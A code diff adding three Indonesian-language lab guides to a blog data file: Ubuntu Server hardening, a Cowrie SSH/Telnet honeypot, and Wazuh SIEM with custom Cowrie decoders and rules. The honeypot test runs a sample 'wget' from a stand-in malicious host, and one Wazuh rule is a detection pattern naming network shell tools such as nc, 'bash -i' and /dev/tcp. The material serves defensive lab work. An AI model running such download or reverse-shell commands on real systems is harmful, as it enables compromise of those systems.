@@ -970,6 +970,1448 @@ Snort IDS successfully implemented dengan hasil:
 **Documentation:** Comprehensive  
 **Next Phase:** IPS mode implementation
     `
+  },
+  {
+    id: 7,
+    title: "Setup Ubuntu Live Server untuk Lab Cybersecurity",
+    slug: "setup-ubuntu-live-server",
+    excerpt: "Panduan lengkap instalasi dan konfigurasi Ubuntu Server 22.04 LTS sebagai environment untuk lab keamanan siber, honeypot, dan SIEM.",
+    category: "Documentation",
+    author: "Lubellion",
+    date: "2024-12-07",
+    readTime: 20,
+    image: "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&q=80",
+    content: `
+# Setup Ubuntu Live Server untuk Lab Cybersecurity
+
+**Experimenter:** Lubellion  
+**Environment:** VMware/VirtualBox/Bare Metal  
+**OS:** Ubuntu Server 22.04 LTS
+
+## 1. Pendahuluan
+
+Ubuntu Server adalah pilihan populer untuk membangun lab keamanan siber karena stabilitas, dukungan komunitas yang luas, dan kompatibilitas dengan berbagai tools security. Dokumentasi ini mencakup instalasi dan konfigurasi dasar Ubuntu Server untuk digunakan sebagai platform honeypot dan SIEM.
+
+### Kebutuhan Sistem:
+- **CPU:** 2 cores minimum (4 cores recommended)
+- **RAM:** 2GB minimum (4GB+ recommended untuk Wazuh)
+- **Storage:** 20GB minimum (50GB+ recommended)
+- **Network:** 1 NIC minimum (2 NIC untuk network separation)
+
+## 2. Download ISO Ubuntu Server
+
+### 2.1 Download dari Official Website
+
+\`\`\`bash
+# Download Ubuntu Server 22.04 LTS
+wget https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso
+
+# Verify checksum
+sha256sum ubuntu-22.04.3-live-server-amd64.iso
+\`\`\`
+
+**Atau download langsung dari:** https://ubuntu.com/download/server
+
+## 3. Instalasi Ubuntu Server
+
+### 3.1 Boot dari ISO
+
+1. Buat VM baru atau boot dari USB
+2. Pilih bahasa: **English**
+3. Pilih keyboard layout: **English (US)** atau sesuai preferensi
+
+### 3.2 Network Configuration
+
+\`\`\`yaml
+# Contoh konfigurasi static IP
+network:
+  version: 2
+  ethernets:
+    ens33:
+      addresses:
+        - 192.168.56.110/24
+      gateway4: 192.168.56.1
+      nameservers:
+        addresses:
+          - 8.8.8.8
+          - 8.8.4.4
+\`\`\`
+
+**Untuk lab, gunakan:**
+- **Static IP** untuk kemudahan akses
+- **Host-only adapter** untuk isolasi
+
+### 3.3 Storage Configuration
+
+Pilih **Use an entire disk** untuk setup sederhana, atau **Custom storage layout** untuk partisi manual:
+
+| Mount Point | Size | Purpose |
+|-------------|------|---------|
+| /boot | 1GB | Boot partition |
+| / | 20GB | Root filesystem |
+| /var | 20GB+ | Logs dan data |
+| swap | 2-4GB | Virtual memory |
+
+### 3.4 Profile Setup
+
+\`\`\`
+Your name: Lab Admin
+Your server's name: honeypot-server
+Pick a username: labadmin
+Choose a password: [strong password]
+\`\`\`
+
+### 3.5 SSH Setup
+
+✅ **Install OpenSSH server** - PENTING untuk remote access
+
+### 3.6 Featured Server Snaps
+
+Skip untuk saat ini - kita akan install secara manual.
+
+## 4. Post-Installation Configuration
+
+### 4.1 Update System
+
+\`\`\`bash
+# Login ke server
+ssh labadmin@192.168.56.110
+
+# Update package list dan upgrade
+sudo apt update && sudo apt upgrade -y
+
+# Install essential tools
+sudo apt install -y vim curl wget git htop net-tools
+\`\`\`
+
+### 4.2 Configure Timezone
+
+\`\`\`bash
+# Set timezone
+sudo timedatectl set-timezone Asia/Jakarta
+
+# Verify
+timedatectl
+\`\`\`
+
+### 4.3 Configure Firewall (UFW)
+
+\`\`\`bash
+# Enable UFW
+sudo ufw enable
+
+# Allow SSH
+sudo ufw allow 22/tcp
+
+# Check status
+sudo ufw status verbose
+\`\`\`
+
+### 4.4 Create Non-Root User untuk Services
+
+\`\`\`bash
+# Create user untuk honeypot
+sudo useradd -m -s /bin/bash honeypot
+sudo passwd honeypot
+
+# Create user untuk monitoring
+sudo useradd -m -s /bin/bash wazuh
+sudo passwd wazuh
+\`\`\`
+
+## 5. Network Configuration untuk Lab
+
+### 5.1 Multiple Network Interfaces
+
+\`\`\`bash
+# Edit netplan configuration
+sudo vim /etc/netplan/00-installer-config.yaml
+\`\`\`
+
+\`\`\`yaml
+network:
+  version: 2
+  ethernets:
+    ens33:  # Management interface
+      addresses:
+        - 192.168.56.110/24
+      gateway4: 192.168.56.1
+      nameservers:
+        addresses: [8.8.8.8, 8.8.4.4]
+    ens34:  # Honeypot interface (exposed)
+      addresses:
+        - 10.0.0.100/24
+\`\`\`
+
+\`\`\`bash
+# Apply configuration
+sudo netplan apply
+\`\`\`
+
+### 5.2 Enable IP Forwarding (Optional)
+
+\`\`\`bash
+# Enable IP forwarding
+echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
+sudo sysctl -p
+\`\`\`
+
+## 6. Security Hardening
+
+### 6.1 SSH Hardening
+
+\`\`\`bash
+sudo vim /etc/ssh/sshd_config
+\`\`\`
+
+\`\`\`
+# Recommended settings
+PermitRootLogin no
+PasswordAuthentication yes  # Set to no jika pakai key
+MaxAuthTries 3
+ClientAliveInterval 300
+ClientAliveCountMax 2
+\`\`\`
+
+\`\`\`bash
+sudo systemctl restart sshd
+\`\`\`
+
+### 6.2 Automatic Security Updates
+
+\`\`\`bash
+sudo apt install -y unattended-upgrades
+sudo dpkg-reconfigure -plow unattended-upgrades
+\`\`\`
+
+### 6.3 Install Fail2ban
+
+\`\`\`bash
+sudo apt install -y fail2ban
+
+# Configure jail
+sudo vim /etc/fail2ban/jail.local
+\`\`\`
+
+\`\`\`ini
+[sshd]
+enabled = true
+port = 22
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3
+bantime = 3600
+\`\`\`
+
+\`\`\`bash
+sudo systemctl enable fail2ban
+sudo systemctl start fail2ban
+\`\`\`
+
+## 7. Monitoring & Logging
+
+### 7.1 Configure Rsyslog
+
+\`\`\`bash
+# Ensure logging is enabled
+sudo systemctl status rsyslog
+
+# View logs
+sudo tail -f /var/log/syslog
+sudo tail -f /var/log/auth.log
+\`\`\`
+
+### 7.2 Install Basic Monitoring Tools
+
+\`\`\`bash
+# System monitoring
+sudo apt install -y htop iotop iftop
+
+# Network monitoring
+sudo apt install -y tcpdump nmap
+\`\`\`
+
+## 8. Snapshot & Backup
+
+### 8.1 Create VM Snapshot
+
+Sebelum menginstall honeypot atau SIEM, buat snapshot:
+
+**VMware:** VM → Snapshot → Take Snapshot  
+**VirtualBox:** Machine → Take Snapshot
+
+### 8.2 Backup Configuration Files
+
+\`\`\`bash
+# Create backup directory
+mkdir -p ~/config-backup
+
+# Backup important configs
+sudo cp /etc/netplan/*.yaml ~/config-backup/
+sudo cp /etc/ssh/sshd_config ~/config-backup/
+sudo cp /etc/hosts ~/config-backup/
+\`\`\`
+
+## 9. Verifikasi Setup
+
+\`\`\`bash
+# Check system info
+hostnamectl
+
+# Check network
+ip addr show
+ip route show
+
+# Check services
+systemctl status sshd
+systemctl status ufw
+
+# Check disk space
+df -h
+
+# Check memory
+free -h
+\`\`\`
+
+## 10. Checklist
+
+| Task | Status |
+|------|--------|
+| Ubuntu Server installed | ✅ |
+| Static IP configured | ✅ |
+| SSH enabled & hardened | ✅ |
+| Firewall (UFW) configured | ✅ |
+| System updated | ✅ |
+| Timezone set | ✅ |
+| Fail2ban installed | ✅ |
+| Snapshot created | ✅ |
+
+## 11. Kesimpulan
+
+Ubuntu Server siap digunakan sebagai platform untuk:
+- **Cowrie Honeypot** - Artikel selanjutnya
+- **Wazuh SIEM** - Artikel selanjutnya
+- Lab penetration testing
+- Network monitoring
+
+**Server Status:** Ready ✅  
+**Next Step:** Install Cowrie Honeypot
+
+---
+
+**Experimenter:** Lubellion  
+**Documentation:** Complete  
+**Environment:** Production-ready for lab use
+    `
+  },
+  {
+    id: 8,
+    title: "Setup Cowrie Honeypot untuk Mendeteksi SSH/Telnet Attacks",
+    slug: "setup-cowrie-honeypot",
+    excerpt: "Panduan lengkap instalasi dan konfigurasi Cowrie Honeypot untuk mendeteksi dan merekam aktivitas penyerang pada SSH dan Telnet services.",
+    category: "Documentation",
+    author: "Lubellion",
+    date: "2024-12-07",
+    readTime: 25,
+    image: "https://images.unsplash.com/photo-1563206767-5b18f218e8de?w=800&q=80",
+    content: `
+# Setup Cowrie Honeypot untuk Mendeteksi SSH/Telnet Attacks
+
+**Experimenter:** Lubellion  
+**Environment:** Ubuntu Server 22.04 LTS  
+**Tool:** Cowrie Honeypot v2.5.0
+
+## 1. Pendahuluan
+
+Cowrie adalah medium-interaction SSH dan Telnet honeypot yang dirancang untuk mencatat serangan brute force dan interaksi shell yang dilakukan penyerang. Honeypot ini sangat berguna untuk:
+
+- Mendeteksi SSH/Telnet brute force attacks
+- Merekam command yang dijalankan penyerang
+- Mengumpulkan malware samples
+- Mempelajari teknik dan tools penyerang
+
+### Fitur Utama Cowrie:
+- Fake filesystem dengan kemampuan add/remove files
+- File contents palsu (seperti /etc/passwd)
+- Session logging dalam format JSON
+- Support untuk SFTP dan SCP
+- Automatic malware download capture
+
+## 2. Prerequisites
+
+### 2.1 System Requirements
+
+\`\`\`bash
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install dependencies
+sudo apt install -y git python3-virtualenv libssl-dev libffi-dev \\
+    build-essential libpython3-dev python3-minimal authbind \\
+    virtualenv python3-venv
+\`\`\`
+
+### 2.2 Create Cowrie User
+
+\`\`\`bash
+# Create dedicated user untuk Cowrie
+sudo adduser --disabled-password --gecos "" cowrie
+
+# Verify user created
+id cowrie
+\`\`\`
+
+## 3. Instalasi Cowrie
+
+### 3.1 Clone Repository
+
+\`\`\`bash
+# Switch ke user cowrie
+sudo su - cowrie
+
+# Clone Cowrie repository
+git clone https://github.com/cowrie/cowrie.git
+cd cowrie
+\`\`\`
+
+### 3.2 Setup Python Virtual Environment
+
+\`\`\`bash
+# Create virtual environment
+python3 -m venv cowrie-env
+
+# Activate virtual environment
+source cowrie-env/bin/activate
+
+# Upgrade pip
+pip install --upgrade pip
+
+# Install requirements
+pip install -r requirements.txt
+\`\`\`
+
+### 3.3 Verify Installation
+
+\`\`\`bash
+# Check if Cowrie can start
+bin/cowrie start
+bin/cowrie status
+bin/cowrie stop
+\`\`\`
+
+## 4. Konfigurasi Cowrie
+
+### 4.1 Copy Configuration File
+
+\`\`\`bash
+# Copy default config
+cd ~/cowrie
+cp etc/cowrie.cfg.dist etc/cowrie.cfg
+
+# Edit configuration
+vim etc/cowrie.cfg
+\`\`\`
+
+### 4.2 Basic Configuration
+
+\`\`\`ini
+[honeypot]
+# Hostname yang ditampilkan ke attacker
+hostname = production-server
+
+# Sensor name untuk logging
+sensor_name = honeypot-01
+
+# Log directory
+log_path = var/log/cowrie
+
+# Download path untuk malware
+download_path = var/lib/cowrie/downloads
+
+# Fake contents untuk /etc/passwd, /etc/shadow, etc
+contents_path = honeyfs
+
+# Timezone
+timezone = Asia/Jakarta
+
+[ssh]
+# Enable SSH honeypot
+enabled = true
+
+# SSH listen port (akan di-forward dari port 22)
+listen_port = 2222
+
+# SSH version string
+version = SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+
+[telnet]
+# Enable Telnet honeypot
+enabled = true
+
+# Telnet listen port
+listen_port = 2223
+\`\`\`
+
+### 4.3 Configure Fake Usernames/Passwords
+
+\`\`\`bash
+# Edit userdb untuk credentials yang diterima
+vim etc/userdb.txt
+\`\`\`
+
+\`\`\`
+# Format: username:uid:password
+# x = any password accepted
+# * = any username accepted
+root:x:!root
+root:x:!admin
+root:x:!123456
+root:x:password
+admin:x:admin
+admin:x:password
+ubuntu:x:ubuntu
+\`\`\`
+
+### 4.4 Configure Output Plugins
+
+\`\`\`ini
+[output_jsonlog]
+enabled = true
+logfile = var/log/cowrie/cowrie.json
+
+[output_textlog]
+enabled = true
+logfile = var/log/cowrie/cowrie.log
+\`\`\`
+
+## 5. Port Redirection
+
+### 5.1 Menggunakan Authbind (Recommended)
+
+\`\`\`bash
+# Exit dari user cowrie
+exit
+
+# Setup authbind untuk port 22 dan 23
+sudo touch /etc/authbind/byport/22
+sudo touch /etc/authbind/byport/23
+sudo chown cowrie:cowrie /etc/authbind/byport/22
+sudo chown cowrie:cowrie /etc/authbind/byport/23
+sudo chmod 770 /etc/authbind/byport/22
+sudo chmod 770 /etc/authbind/byport/23
+\`\`\`
+
+Edit Cowrie config untuk menggunakan authbind:
+
+\`\`\`ini
+[ssh]
+listen_port = 22
+
+[telnet]
+listen_port = 23
+\`\`\`
+
+Edit startup script:
+
+\`\`\`bash
+sudo su - cowrie
+vim ~/cowrie/bin/cowrie
+\`\`\`
+
+Ubah baris AUTHBIND_ENABLED:
+\`\`\`bash
+AUTHBIND_ENABLED=yes
+\`\`\`
+
+### 5.2 Menggunakan IPTables (Alternative)
+
+\`\`\`bash
+# Redirect port 22 ke 2222
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+
+# Redirect port 23 ke 2223
+sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223
+
+# Save rules
+sudo apt install -y iptables-persistent
+sudo netfilter-persistent save
+\`\`\`
+
+### 5.3 Pindahkan SSH Asli ke Port Lain
+
+\`\`\`bash
+# Edit SSH config
+sudo vim /etc/ssh/sshd_config
+\`\`\`
+
+\`\`\`
+Port 22222  # Management SSH
+\`\`\`
+
+\`\`\`bash
+# Restart SSH
+sudo systemctl restart sshd
+
+# Update firewall
+sudo ufw allow 22222/tcp
+sudo ufw allow 22/tcp
+sudo ufw allow 23/tcp
+\`\`\`
+
+## 6. Start Cowrie
+
+### 6.1 Manual Start
+
+\`\`\`bash
+sudo su - cowrie
+cd cowrie
+source cowrie-env/bin/activate
+bin/cowrie start
+\`\`\`
+
+### 6.2 Check Status
+
+\`\`\`bash
+bin/cowrie status
+# Output: cowrie is running (PID: XXXX)
+
+# Check listening ports
+netstat -tlnp | grep -E "22|23|2222|2223"
+\`\`\`
+
+### 6.3 Create Systemd Service
+
+\`\`\`bash
+sudo vim /etc/systemd/system/cowrie.service
+\`\`\`
+
+\`\`\`ini
+[Unit]
+Description=Cowrie SSH/Telnet Honeypot
+After=network.target
+
+[Service]
+Type=forking
+User=cowrie
+Group=cowrie
+WorkingDirectory=/home/cowrie/cowrie
+ExecStart=/home/cowrie/cowrie/bin/cowrie start
+ExecStop=/home/cowrie/cowrie/bin/cowrie stop
+PIDFile=/home/cowrie/cowrie/var/run/cowrie.pid
+Restart=on-failure
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+\`\`\`
+
+\`\`\`bash
+# Enable dan start service
+sudo systemctl daemon-reload
+sudo systemctl enable cowrie
+sudo systemctl start cowrie
+sudo systemctl status cowrie
+\`\`\`
+
+## 7. Testing Cowrie
+
+### 7.1 Test SSH Connection
+
+\`\`\`bash
+# Dari machine lain, coba SSH ke honeypot
+ssh root@<honeypot-ip>
+# Masukkan password: admin atau password
+
+# Anda akan masuk ke fake shell
+# Coba jalankan beberapa command:
+whoami
+pwd
+ls -la
+cat /etc/passwd
+uname -a
+wget http://malicious-site.com/malware
+exit
+\`\`\`
+
+### 7.2 Test Telnet Connection
+
+\`\`\`bash
+telnet <honeypot-ip>
+# Login dengan credentials dari userdb.txt
+\`\`\`
+
+## 8. Monitoring & Logs
+
+### 8.1 View Live Logs
+
+\`\`\`bash
+# Text log
+tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.log
+
+# JSON log
+tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json | jq '.'
+\`\`\`
+
+### 8.2 Sample Log Output
+
+\`\`\`json
+{
+  "eventid": "cowrie.login.success",
+  "username": "root",
+  "password": "admin",
+  "message": "login attempt [root/admin] succeeded",
+  "sensor": "honeypot-01",
+  "timestamp": "2024-12-07T10:30:45.123456Z",
+  "src_ip": "192.168.1.100",
+  "session": "a1b2c3d4"
+}
+\`\`\`
+
+### 8.3 View Downloaded Malware
+
+\`\`\`bash
+ls -la /home/cowrie/cowrie/var/lib/cowrie/downloads/
+\`\`\`
+
+## 9. Log Analysis
+
+### 9.1 Quick Statistics
+
+\`\`\`bash
+# Count login attempts
+cat cowrie.json | jq -r 'select(.eventid=="cowrie.login.failed") | .username' | sort | uniq -c | sort -rn | head -20
+
+# Top source IPs
+cat cowrie.json | jq -r '.src_ip' | sort | uniq -c | sort -rn | head -20
+
+# Commands executed
+cat cowrie.json | jq -r 'select(.eventid=="cowrie.command.input") | .input' | sort | uniq -c | sort -rn
+\`\`\`
+
+### 9.2 Export for Analysis
+
+\`\`\`bash
+# Export ke CSV
+cat cowrie.json | jq -r '[.timestamp, .src_ip, .eventid, .username, .password] | @csv' > cowrie_analysis.csv
+\`\`\`
+
+## 10. Troubleshooting
+
+### Common Issues:
+
+**1. Port already in use:**
+\`\`\`bash
+sudo lsof -i :22
+# Kill conflicting process atau change port
+\`\`\`
+
+**2. Permission denied:**
+\`\`\`bash
+# Check authbind setup
+ls -la /etc/authbind/byport/
+\`\`\`
+
+**3. Cowrie won't start:**
+\`\`\`bash
+# Check log for errors
+cat /home/cowrie/cowrie/var/log/cowrie/cowrie.log
+\`\`\`
+
+## 11. Security Considerations
+
+⚠️ **IMPORTANT:**
+
+1. **Isolate honeypot** - Gunakan network terpisah
+2. **Monitor resources** - Attacker bisa DoS honeypot
+3. **Regular updates** - Update Cowrie secara berkala
+4. **Backup logs** - Export logs ke server terpisah
+5. **Don't expose management SSH** - Gunakan VPN atau IP whitelist
+
+## 12. Checklist
+
+| Task | Status |
+|------|--------|
+| Dependencies installed | ✅ |
+| Cowrie user created | ✅ |
+| Cowrie installed | ✅ |
+| Configuration complete | ✅ |
+| Port redirection setup | ✅ |
+| SSH moved to different port | ✅ |
+| Systemd service created | ✅ |
+| Firewall configured | ✅ |
+| Testing complete | ✅ |
+
+## 13. Kesimpulan
+
+Cowrie Honeypot berhasil diinstall dan dikonfigurasi. Honeypot siap untuk:
+- Mendeteksi SSH brute force attacks
+- Mencatat aktivitas penyerang
+- Mengumpulkan malware samples
+- **Integrasi dengan Wazuh SIEM** (Artikel selanjutnya)
+
+**Honeypot Status:** Active ✅  
+**Next Step:** Setup Wazuh dan Agent
+
+---
+
+**Experimenter:** Lubellion  
+**Documentation:** Complete  
+**Integration:** Ready for Wazuh
+    `
+  },
+  {
+    id: 9,
+    title: "Setup Wazuh SIEM dan Agent untuk Monitoring Honeypot",
+    slug: "setup-wazuh-siem-honeypot",
+    excerpt: "Panduan lengkap instalasi Wazuh Server sebagai SIEM dan konfigurasi Wazuh Agent pada Cowrie Honeypot untuk centralized security monitoring.",
+    category: "Documentation",
+    author: "Lubellion",
+    date: "2024-12-07",
+    readTime: 35,
+    image: "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&q=80",
+    content: `
+# Setup Wazuh SIEM dan Agent untuk Monitoring Honeypot
+
+**Experimenter:** Lubellion  
+**Environment:** Ubuntu Server 22.04 LTS  
+**Tools:** Wazuh 4.x, Wazuh Dashboard
+
+## 1. Pendahuluan
+
+Wazuh adalah open-source security platform yang menyediakan unified XDR dan SIEM protection. Dengan mengintegrasikan Wazuh ke Cowrie Honeypot, kita dapat:
+
+- Centralized log management
+- Real-time threat detection
+- Security analytics dan visualization
+- Automated alerting
+- Compliance monitoring
+
+### Arsitektur Lab:
+
+\`\`\`
+┌─────────────────┐     ┌─────────────────┐
+│  Wazuh Server   │     │ Cowrie Honeypot │
+│  (Manager +     │◄────│ (Wazuh Agent)   │
+│   Dashboard)    │     │                 │
+│ 192.168.56.120  │     │ 192.168.56.110  │
+└─────────────────┘     └─────────────────┘
+         │
+         ▼
+┌─────────────────┐
+│  Wazuh Dashboard│
+│  (Web Interface)│
+│    Port 443     │
+└─────────────────┘
+\`\`\`
+
+## 2. System Requirements
+
+### Wazuh Server:
+- **CPU:** 4 cores
+- **RAM:** 8GB minimum (16GB recommended)
+- **Storage:** 50GB minimum
+- **OS:** Ubuntu Server 22.04 LTS
+
+### Wazuh Agent (Honeypot):
+- **CPU:** 1 core
+- **RAM:** 512MB
+- **Storage:** Minimal
+
+## 3. Instalasi Wazuh Server (All-in-One)
+
+### 3.1 Persiapan Server
+
+\`\`\`bash
+# SSH ke Wazuh server
+ssh labadmin@192.168.56.120
+
+# Update system
+sudo apt update && sudo apt upgrade -y
+
+# Install dependencies
+sudo apt install -y curl apt-transport-https unzip wget
+\`\`\`
+
+### 3.2 Install Wazuh dengan Installer Script
+
+\`\`\`bash
+# Download installer
+curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
+
+# Run installer (all-in-one: indexer + manager + dashboard)
+sudo bash wazuh-install.sh -a
+\`\`\`
+
+**Proses ini memakan waktu 10-15 menit.** Installer akan:
+1. Install Wazuh Indexer (Elasticsearch fork)
+2. Install Wazuh Manager
+3. Install Wazuh Dashboard (Kibana fork)
+4. Generate SSL certificates
+5. Configure semua komponen
+
+### 3.3 Catat Credentials
+
+Setelah instalasi selesai, catat kredensial admin:
+
+\`\`\`
+INFO: --- Summary ---
+INFO: You can access the web interface https://<wazuh-dashboard-ip>
+    User: admin
+    Password: <generated-password>
+\`\`\`
+
+### 3.4 Extract Password (jika lupa)
+
+\`\`\`bash
+sudo tar -xvf wazuh-install-files.tar -C /tmp/ ./wazuh-install-files/wazuh-passwords.txt
+cat /tmp/wazuh-install-files/wazuh-passwords.txt
+\`\`\`
+
+## 4. Akses Wazuh Dashboard
+
+### 4.1 Buka Browser
+
+\`\`\`
+URL: https://192.168.56.120
+Username: admin
+Password: <from installation>
+\`\`\`
+
+### 4.2 Verifikasi Dashboard
+
+Setelah login, Anda akan melihat:
+- Overview dashboard
+- Security events
+- Agents (currently 0)
+- Management sections
+
+## 5. Konfigurasi Wazuh Manager
+
+### 5.1 Configure Agent Registration
+
+\`\`\`bash
+# Edit ossec.conf
+sudo vim /var/ossec/etc/ossec.conf
+\`\`\`
+
+Pastikan remote connection enabled:
+
+\`\`\`xml
+<ossec_config>
+  <remote>
+    <connection>secure</connection>
+    <port>1514</port>
+    <protocol>tcp</protocol>
+  </remote>
+</ossec_config>
+\`\`\`
+
+### 5.2 Restart Manager
+
+\`\`\`bash
+sudo systemctl restart wazuh-manager
+sudo systemctl status wazuh-manager
+\`\`\`
+
+### 5.3 Configure Firewall
+
+\`\`\`bash
+# Open required ports
+sudo ufw allow 1514/tcp  # Agent communication
+sudo ufw allow 1515/tcp  # Agent registration
+sudo ufw allow 443/tcp   # Dashboard
+sudo ufw allow 55000/tcp # Wazuh API
+sudo ufw reload
+\`\`\`
+
+## 6. Instalasi Wazuh Agent pada Honeypot
+
+### 6.1 SSH ke Honeypot Server
+
+\`\`\`bash
+ssh -p 22222 labadmin@192.168.56.110
+\`\`\`
+
+### 6.2 Add Wazuh Repository
+
+\`\`\`bash
+# Import GPG key
+curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
+
+# Add repository
+echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
+
+# Update
+sudo apt update
+\`\`\`
+
+### 6.3 Install Wazuh Agent
+
+\`\`\`bash
+# Install dengan konfigurasi manager
+WAZUH_MANAGER="192.168.56.120" sudo apt install -y wazuh-agent
+\`\`\`
+
+### 6.4 Configure Agent
+
+\`\`\`bash
+sudo vim /var/ossec/etc/ossec.conf
+\`\`\`
+
+\`\`\`xml
+<ossec_config>
+  <client>
+    <server>
+      <address>192.168.56.120</address>
+      <port>1514</port>
+      <protocol>tcp</protocol>
+    </server>
+    <enrollment>
+      <enabled>yes</enabled>
+      <manager_address>192.168.56.120</manager_address>
+      <port>1515</port>
+    </enrollment>
+  </client>
+</ossec_config>
+\`\`\`
+
+### 6.5 Start Agent
+
+\`\`\`bash
+sudo systemctl daemon-reload
+sudo systemctl enable wazuh-agent
+sudo systemctl start wazuh-agent
+sudo systemctl status wazuh-agent
+\`\`\`
+
+### 6.6 Verify Registration
+
+\`\`\`bash
+# Check agent status
+sudo /var/ossec/bin/agent_control -l
+
+# Check connection to manager
+sudo cat /var/ossec/logs/ossec.log | grep "Connected to"
+\`\`\`
+
+## 7. Konfigurasi Monitoring Cowrie Logs
+
+### 7.1 Add Cowrie Log Monitoring
+
+Edit agent configuration:
+
+\`\`\`bash
+sudo vim /var/ossec/etc/ossec.conf
+\`\`\`
+
+Tambahkan localfile untuk Cowrie:
+
+\`\`\`xml
+<ossec_config>
+  <!-- Cowrie JSON Log -->
+  <localfile>
+    <log_format>json</log_format>
+    <location>/home/cowrie/cowrie/var/log/cowrie/cowrie.json</location>
+    <label key="log_type">cowrie</label>
+  </localfile>
+  
+  <!-- Cowrie Text Log -->
+  <localfile>
+    <log_format>syslog</log_format>
+    <location>/home/cowrie/cowrie/var/log/cowrie/cowrie.log</location>
+  </localfile>
+</ossec_config>
+\`\`\`
+
+### 7.2 Set Log Permissions
+
+\`\`\`bash
+# Allow wazuh to read cowrie logs
+sudo usermod -aG cowrie wazuh
+sudo chmod 750 /home/cowrie/cowrie/var/log/cowrie
+sudo chmod 640 /home/cowrie/cowrie/var/log/cowrie/*.json
+sudo chmod 640 /home/cowrie/cowrie/var/log/cowrie/*.log
+\`\`\`
+
+### 7.3 Restart Agent
+
+\`\`\`bash
+sudo systemctl restart wazuh-agent
+\`\`\`
+
+## 8. Create Custom Rules untuk Cowrie
+
+### 8.1 SSH ke Wazuh Manager
+
+\`\`\`bash
+ssh labadmin@192.168.56.120
+\`\`\`
+
+### 8.2 Create Custom Decoder
+
+\`\`\`bash
+sudo vim /var/ossec/etc/decoders/local_decoder.xml
+\`\`\`
+
+\`\`\`xml
+<!--
+  Cowrie Honeypot Decoders
+-->
+
+<decoder name="cowrie-json">
+  <prematch>^{"eventid":</prematch>
+</decoder>
+
+<decoder name="cowrie-login-success">
+  <parent>cowrie-json</parent>
+  <regex>"eventid":"cowrie.login.success".*"username":"(\\S+)".*"password":"(\\S+)".*"src_ip":"(\\S+)"</regex>
+  <order>user, extra_data, srcip</order>
+</decoder>
+
+<decoder name="cowrie-login-failed">
+  <parent>cowrie-json</parent>
+  <regex>"eventid":"cowrie.login.failed".*"username":"(\\S+)".*"password":"(\\S+)".*"src_ip":"(\\S+)"</regex>
+  <order>user, extra_data, srcip</order>
+</decoder>
+
+<decoder name="cowrie-command">
+  <parent>cowrie-json</parent>
+  <regex>"eventid":"cowrie.command.input".*"input":"(.*)".*"src_ip":"(\\S+)"</regex>
+  <order>extra_data, srcip</order>
+</decoder>
+
+<decoder name="cowrie-download">
+  <parent>cowrie-json</parent>
+  <regex>"eventid":"cowrie.session.file_download".*"url":"(.*)".*"src_ip":"(\\S+)"</regex>
+  <order>url, srcip</order>
+</decoder>
+\`\`\`
+
+### 8.3 Create Custom Rules
+
+\`\`\`bash
+sudo vim /var/ossec/etc/rules/local_rules.xml
+\`\`\`
+
+\`\`\`xml
+<!--
+  Cowrie Honeypot Rules
+  Rule IDs: 100100 - 100199
+-->
+
+<group name="cowrie,honeypot,">
+  
+  <!-- Base rule for Cowrie events -->
+  <rule id="100100" level="0">
+    <decoded_as>cowrie-json</decoded_as>
+    <description>Cowrie honeypot event</description>
+  </rule>
+
+  <!-- Successful login to honeypot - CRITICAL -->
+  <rule id="100101" level="12">
+    <if_sid>100100</if_sid>
+    <match>cowrie.login.success</match>
+    <description>Cowrie: Successful SSH/Telnet login to honeypot</description>
+    <group>authentication_success,honeypot_breach,</group>
+  </rule>
+
+  <!-- Failed login attempt -->
+  <rule id="100102" level="6">
+    <if_sid>100100</if_sid>
+    <match>cowrie.login.failed</match>
+    <description>Cowrie: Failed login attempt</description>
+    <group>authentication_failed,brute_force,</group>
+  </rule>
+
+  <!-- Multiple failed logins - Brute Force -->
+  <rule id="100103" level="10" frequency="10" timeframe="60">
+    <if_matched_sid>100102</if_matched_sid>
+    <same_source_ip />
+    <description>Cowrie: Brute force attack detected</description>
+    <group>authentication_failed,brute_force,</group>
+  </rule>
+
+  <!-- Command executed in honeypot -->
+  <rule id="100104" level="10">
+    <if_sid>100100</if_sid>
+    <match>cowrie.command.input</match>
+    <description>Cowrie: Command executed by attacker</description>
+    <group>honeypot_activity,</group>
+  </rule>
+
+  <!-- Malicious commands -->
+  <rule id="100105" level="14">
+    <if_sid>100104</if_sid>
+    <regex>wget|curl|chmod|nc|bash -i|/dev/tcp|python -c|perl -e</regex>
+    <description>Cowrie: Potentially malicious command executed</description>
+    <group>honeypot_activity,malware,</group>
+  </rule>
+
+  <!-- File download in honeypot -->
+  <rule id="100106" level="14">
+    <if_sid>100100</if_sid>
+    <match>cowrie.session.file_download</match>
+    <description>Cowrie: Attacker downloaded file/malware</description>
+    <group>honeypot_activity,malware_download,</group>
+  </rule>
+
+  <!-- New session -->
+  <rule id="100107" level="5">
+    <if_sid>100100</if_sid>
+    <match>cowrie.session.connect</match>
+    <description>Cowrie: New connection to honeypot</description>
+    <group>honeypot_activity,</group>
+  </rule>
+
+  <!-- Session closed -->
+  <rule id="100108" level="3">
+    <if_sid>100100</if_sid>
+    <match>cowrie.session.closed</match>
+    <description>Cowrie: Session closed</description>
+    <group>honeypot_activity,</group>
+  </rule>
+
+</group>
+\`\`\`
+
+### 8.4 Verify and Restart
+
+\`\`\`bash
+# Test configuration
+sudo /var/ossec/bin/wazuh-analysisd -t
+
+# Restart manager
+sudo systemctl restart wazuh-manager
+\`\`\`
+
+## 9. Wazuh Dashboard Configuration
+
+### 9.1 Create Cowrie Index Pattern
+
+1. Login ke Wazuh Dashboard
+2. Navigate ke **Stack Management** → **Index Patterns**
